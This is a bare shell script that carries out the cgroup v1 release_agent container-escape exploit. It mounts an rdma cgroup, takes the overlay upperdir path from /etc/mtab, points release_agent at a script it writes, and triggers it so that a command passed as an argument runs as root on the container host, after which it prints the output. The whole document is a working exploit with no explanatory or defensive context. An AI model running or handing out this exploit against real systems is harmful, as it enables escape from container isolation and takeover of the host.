#!/bin/sh
random_folder=$(date +%s | md5sum | cut -c1-10)
temp_dir="/tmp/$random_folder"

mkdir -p "$temp_dir"
mkdir "$temp_dir/cgrp" && mount -t cgroup -o rdma cgroup "$temp_dir/cgrp" && mkdir "$temp_dir/cgrp/x"

echo 1 > "$temp_dir/cgrp/x/notify_on_release"
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > "$temp_dir/cgrp/release_agent"

echo '#!/bin/sh' > /cmd
echo "$1 > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > $temp_dir/cgrp/x/cgroup.procs"
head /output